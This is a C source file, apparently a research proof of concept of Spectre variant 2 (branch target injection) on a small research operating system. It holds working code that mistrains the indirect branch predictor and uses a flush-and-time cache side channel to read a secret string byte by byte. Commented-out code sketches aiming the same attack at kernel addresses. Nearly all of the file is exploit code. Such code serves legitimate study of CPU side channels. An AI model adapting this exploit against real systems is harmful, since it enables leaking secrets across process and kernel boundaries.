#pragma GCC push_options
#pragma GCC optimize ("O0")

#include <stdio.h>
#include "types.h"
#include "user.h"

#include <uk/mman.h>
#include <uk/asm.h>
#include <cstring>
#include <stdlib.h>
#include "amd64.h"

#define USER_MASK ((1ull << 47) - 1) // 4 level paging => 48 bit va, top bit is kernel/user
#define PAGE_BITS 12
#define PAGE_SIZE (1ull << PAGE_BITS)
#define PAGE_INDEX_MASK ~((1ull << PAGE_BITS) - 1)

#define CACHE_HIT_THRESHOLD 80
#define GAP 1024

u8 *channel;
u64 *target;
char *secretPhrase = "The Magic Words are Squeamish Ossifrage.";

__attribute__((noinline))
int
user_gadget(char *addr)
{
  //printf("value: %d\n", value);
  // writes may not fetch line into cache?
  /*
  channel[value * GAP] = 5;
  return 5;
  */
  return channel[*addr * GAP];
}

__attribute__((noinline))
int
user_dummy()
{
  return 4;
}

__attribute__((noinline))
int
user_victim(volatile char *addr, volatile int input)
{
  int junk = 0;
  // set up bhb by performing >29 taken branches
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }

  int result;
  __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (*target));
  return result & junk;
}

// mimic the safe target
__attribute__((noinline))
int
dummy_gadget(void)
{
  return 3;
}

// mimic the victim
__attribute__((noinline))
int
dummy_victim(u8 *channel, u64 dest, int input)
{
  int junk = 0;
  // set up bhb by performing >29 taken branches
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }

  // use 10 nops to get the offsets between user and kernel to match
  int result;
  __asm volatile("nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
                 "callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (dest));
  return result & junk & ((u64)channel);
}

void*
mmap_two_pages(u64 addr)
{
  return mmap((void*) (addr & PAGE_INDEX_MASK),
              PAGE_SIZE * 2, // map 2 pages just in case we're close to boundary
              PROT_READ | PROT_WRITE,
              MAP_ANONYMOUS,
              0, 0);
}

int
readByte(volatile char *addrToRead, char result[2])
{
  int hits[256]; // record cache hits
  int tries, i, j, k, mix_i, junk = 0;
  u64 start, elapsed;
  char dummyChar = '$';
  volatile u8 *addr;
  volatile char *dummyCharAddr = &dummyChar;
  //volatile int secret;

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 1;
  }

  for (tries = 999; tries > 0; tries--) {
    // poison branch predictor
    //set_safe_addr(kga);
    *target = (u64)&user_gadget;
    mfence();

    //secret = 84;
    for (j = 50; j > 0; j--) {
      junk ^= user_victim(dummyCharAddr, 5);
      // junk ^= uv(channel, (u64) &dummy_gadget, 0);
      //junk ^= victim(channel, 84, 0);
      //printf("correct elapsed: %lu\n", elapsed);
    }

    mfence();

    // flush side channel
    for (i = 0; i < 256; i++)
      clflush(&channel[i * GAP]);

    mfence();

    //set_safe_addr(ksa);
    *target = (u64)&user_dummy;

    mfence();
    // flush actual target
    //flush_target();
    clflush((void*) target);
    //secret = 42;

    mfence();

    // set up registers
    // victim speculatively executes gadget
    // gadget will read from address at (%rdi, 512 * (%rsi), 1)
    /*
    __asm volatile("mov %0, %%rdi\n"
                   "mov %1, %%rsi\n"
                   :: "r" (channel), "r" (&secret)
                   : "%rdi", "%rsi");
    */

    // call victim
    junk ^= user_victim(addrToRead, 0);
    // junk ^= victim(channel, 42, 0);
    //printf("incorrect elapsed: %lu\n", elapsed);

    //junk ^= channel[250 * GAP];
    //gadget(channel, &secret);

    mfence();

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = rdtsc();
      junk ^= *addr;
      mfence(); // make sure read completes before we check the timer
      elapsed = rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }
  }

  // locate top two results
  j = k = -1;
  for (i = 0; i < 256; i++) {
    /*
    if (hits[i] > 0)
      printf("i: %d, hits: %d\n", i, hits[i]);
    */

    if (j < 0 || hits[i] >= hits[j]) {
      k = j;
      j = i;
    } else if (k < 0 || hits[i] >= hits[k]) {
      k = i;
    }
  }

  if ((hits[j] >= 2 * hits[k] + 5) ||
      (hits[j] == 2 && hits[k] == 0)) {
    result[0] = (char) j;
    result[1] = 1;
  } else {
    result[0] = 0;
    result[1] = 0;
  }

  return junk; // prevent junk from being optimized out
}

int
main(int argc, char *argv[])
{
  // u64 kva = get_victim_addr(); // need to mistrain this call
  // u64 kga = get_gadget_addr(); // to predict here
  // printf("kva: 0x%lx, kga: 0x%lx\n", kva, kga);
  // u64 ksa = get_safe_addr();

  // int kvoffset = get_victim_offset(); // offset to call instruction
  // printf("kvoffset: %d\n", kvoffset);

  // int uvoffset;
  // u8 *code = (u8*) &dummy_victim;
  // for (uvoffset = 0; *(code + uvoffset) != 0xff; uvoffset++);
  // printf("uvoffset: %d\n", uvoffset);

  // if (false && kvoffset != uvoffset) {
  //   printf("kernel and user offsets don't match\n");
  //   return 1;
  // }

  // u64 uva = (kva & USER_MASK) + kvoffset - uvoffset;
  // printf("uva: 0x%lx\n", uva);

  // if (mmap_two_pages(uva) == MAP_FAILED) {
  //   printf("mmap uva failed\n");
  //   return 1;
  // }

  // u64 uga = kga & USER_MASK;
  // printf("uga: 0x%lx\n", uga);

  // if (mmap_two_pages(uga) == MAP_FAILED) {
  //   printf("mmap uga failed\n");
  //   return 1;
  // }

  // // 64 just has to be larger than function
  // memcpy((void*) uva, (void*) &dummy_victim, 64);

  // // 8 so that we don't overwrite uva
  // memcpy((void*) uga, (void*) &dummy_gadget, 8);

  // /*
  // auto uv = ((int (*)(u8*, u64, int)) uva);
  // */

  // target = (u64*)malloc(sizeof(u64));
  // printf("target addr: 0x%lx\n", (u64)target);
  // printf("user gadget: 0x%lx\n", (u64)&user_gadget);
  // printf("user victim: 0x%lx\n", (u64)&user_victim);

  // // see appendix C of https://spectreattack.com/spectre.pdf
  // channel = (u8*) malloc(256 * GAP * sizeof(u8));
  // int hits[256]; // record cache hits
  // int tries, i, j, k, mix_i, junk = 0;
  // u64 start, elapsed;
  // volatile u8 *addr;
  // volatile int secret;

  // for (i = 0; i < 256; i++) {
  //   hits[i] = 0;
  //   channel[i * GAP] = 1;
  // }

  // for (tries = 999; tries > 0; tries--) {
  //   // poison branch predictor
  //   //set_safe_addr(kga);
  //   *target = (u64)&user_gadget;
  //   mfence();

  //   secret = 84;
  //   for (j = 50; j > 0; j--) {
  //     junk ^= user_victim(secret, 5);
  //     // junk ^= uv(channel, (u64) &dummy_gadget, 0);
  //     //junk ^= victim(channel, 84, 0);
  //     //printf("correct elapsed: %lu\n", elapsed);
  //   }

  //   mfence();

  //   // flush side channel
  //   for (i = 0; i < 256; i++)
  //     clflush(&channel[i * GAP]);

  //   mfence();

  //   //set_safe_addr(ksa);
  //   *target = (u64)&user_dummy;

  //   mfence();
  //   // flush actual target
  //   //flush_target();
  //   clflush((void*) target);
  //   secret = 42;

  //   mfence();

  //   // set up registers
  //   // victim speculatively executes gadget
  //   // gadget will read from address at (%rdi, 512 * (%rsi), 1)
  //   /*
  //   __asm volatile("mov %0, %%rdi\n"
  //                  "mov %1, %%rsi\n"
  //                  :: "r" (channel), "r" (&secret)
  //                  : "%rdi", "%rsi");
  //   */

  //   // call victim
  //   junk ^= user_victim(secret, 0);
  //   // junk ^= victim(channel, 42, 0);
  //   //printf("incorrect elapsed: %lu\n", elapsed);

  //   //junk ^= channel[250 * GAP];
  //   //gadget(channel, &secret);

  //   mfence();

  //   // time reads, mix up order to prevent stride prediction
  //   for (i = 0; i < 256; i++) {
  //     mix_i = ((i * 167) + 13) & 255;
  //     addr = &channel[mix_i * GAP];
  //     start = rdtsc();
  //     junk ^= *addr;
  //     mfence(); // make sure read completes before we check the timer
  //     elapsed = rdtsc() - start;
  //     if (elapsed <= CACHE_HIT_THRESHOLD)
  //       hits[mix_i]++;
  //   }
  // }

  // // locate top two results
  // j = k = -1;
  // for (i = 0; i < 256; i++) {
  //   if (hits[i] > 0)
  //     printf("i: %d, hits: %d\n", i, hits[i]);

  //   if (j < 0 || hits[i] >= hits[j]) {
  //     k = j;
  //     j = i;
  //   } else if (k < 0 || hits[i] >= hits[k]) {
  //     k = i;
  //   }
  // }
  // if ((hits[j] >= 2 * hits[k] + 5) ||
  //     (hits[j] == 2 && hits[k] == 0)) {
  //   printf("hit: %d\n", j);
  // } else {
  //   printf("no hit\n");
  // }

  // printf("junk: %d\n", junk); // prevent junk from being optimized out

  target = (u64*)malloc(sizeof(u64));
  channel = (u8*)malloc(256 * GAP * sizeof(u8));

  int junk = 0;
  char result[2];
  int index = 0;

  printf("Reading secret phrase: ");
  while (index < 40) {
    junk += readByte(secretPhrase + index, result);
    if (result[1] == 1) {
      if (result[0] == 0)
        break;
      printf("%c", result[0]);
    } else {
      printf("?");
    }
    index++;
  }
  printf("\ndone! (junk = %d)\n", junk);

  /*
  char answer = 43;
  junk += readByte(&answer, result);

  if (result[1] == 1) {
    printf("result: %d\n", result[0]);
  } else {
    printf("no result\n");
  }
  printf("junk: %d\n", junk);
  */

  return 0;
}

#pragma GCC pop_options
